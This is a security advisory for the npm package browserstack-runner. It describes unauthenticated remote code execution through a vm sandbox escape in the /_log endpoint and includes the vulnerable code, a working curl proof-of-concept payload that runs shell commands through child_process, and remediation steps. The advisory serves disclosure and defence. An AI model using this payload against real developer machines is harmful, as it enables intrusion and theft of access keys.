# [H] browserstack-runner vulnerable to Remote Code Execution via vm sandbox escape in _log HTTP handler

## Summary
Severity: High
Advisory: GHSA-6vr3-7wcx-v5g5
CVE: CVE-2026-49143
CWE: CWE-94
Ecosystem: npm
CVSS: CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-06-03
Source: https://github.com/advisories/GHSA-6vr3-7wcx-v5g5
Type: github-advisory

## Affected
- npm: `browserstack-runner` — affected >=0

## Details
### Summary

The HTTP handler `/_log` in `lib/server.js` (lines 491–515) of browserstack-runner passes unauthenticated user-supplied data to `vm.runInNewContext()` combined with `eval()`, enabling a sandbox escape and arbitrary code execution on the host system.

### Details

When `browserstack-runner` starts, it creates an HTTP server on port 8888 (configurable) that listens on all network interfaces (`0.0.0.0`). The `/_log` endpoint accepts POST requests and processes the JSON body as follows:

```javascript
// lib/server.js lines 504-510
var context = { input: query.arguments, format: util.format, output: '' };
var tryEvalOrString = 'function (arg) { try { return eval(\'o = \' + arg); } catch (e) { return arg; } }';
vm.runInNewContext('output = format.apply(null, input.map(' + tryEvalOrString + '));', context);
```

The `vm` module is [not a security mechanism](https://nodejs.org/api/vm.html#vm-executing-javascript) per Node.js documentation. The `context` object contains a reference to `util.format` (a host-context Function), enabling sandbox escape via `this.constructor.constructor("return process")()`.

Unlike the `_progress` and `_report` handlers which verify worker UUID authentication, the `_log` handler does not gate on authentication.

### Proof of Concept

```bash
# Terminal 1: start the runner
echo '<html><body>t</body></html>' > t.html
echo '{"username":"X","key":"X","test_path":"t.html","test_framework":"qunit","browsers":[]}' > browserstack.json
node bin/runner.js

# Terminal 2: exploit
curl -s http://127.0.0.1:8888/_log \
  -H "Content-Type: application/json" \
  -d '{"arguments":["this.constructor.constructor(\"return process.mainModule.require(\`child_process\`).execSync(\`id\`).toString()\")()"]}'

# Terminal 1 output shows:
# [undefined] uid=1000(user) gid=1000(user) ...
```

### Impact

An attacker on the same network as a developer running `browserstack-runner` can execute arbitrary commands on the developer's machine without authentication. The attack window exists for the duration of the test run (typically 1–15 minutes). The BrowserStack access key is accessible in the same process context via environment variables.

### Remediation

1. Remove `eval()` and `vm.runInNewContext()` from the `_log` handler — use `JSON.stringify()` for safe logging
2. Add UUID authentication to `_log` (matching `_progress` and `_report` handlers)
3. Bind the HTTP server on `127.0.0.1` instead of `0.0.0.0`

### Credit

Christ Bowel Bouchuen

## References
- https://github.com/browserstack/browserstack-runner/security/advisories/GHSA-6vr3-7wcx-v5g5
- https://nvd.nist.gov/vuln/detail/CVE-2026-49143
- https://github.com/browserstack/browserstack-runner
- https://www.vulncheck.com/advisories/browserstack-runner-unauthenticated-rce-via-log-http-handler
